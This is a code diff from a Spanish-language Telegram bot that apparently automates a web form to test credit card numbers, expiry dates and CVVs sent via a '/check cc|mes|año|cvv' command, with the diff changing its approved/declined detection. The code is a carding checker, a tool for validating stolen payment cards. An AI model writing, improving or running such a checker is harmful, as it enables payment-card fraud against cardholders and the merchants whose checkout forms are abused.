@@ -51,11 +51,11 @@ async def completar_formulario(binlargo, mes, anio, code):
         await page.click("input#MainContent_btnGenerarTarjeta")
         await page.wait_for_timeout(2000)
         error_text = await page.text_content("body")
-        if "La transacción ha sido rechazada." in error_text:
+        if "aprobada" in error_text.lower():
             await browser.close()
-            return False
+            return True
         await browser.close()
-        return True
+        return False
 
 async def process_queue():
     while queue:
@@ -98,7 +98,7 @@ async def process_queue():
 def handle_start(message):
     bot.reply_to(message, "¡Hola! 👋 Soy tu asistente virtual 💻✨\n\n"
                           "Estoy aquí para ayudarte con el checkeo de tarjetas de manera rápida y segura. "
-                          "Solo debes enviarme el formato correcto: /check cc|mes|año|cvv. ")
+                          "Solo debes enviarme el formato correcto: /check cc|mes|año|cvv.")
 
 @bot.message_handler(commands=['check'])
 def handle_check(message):
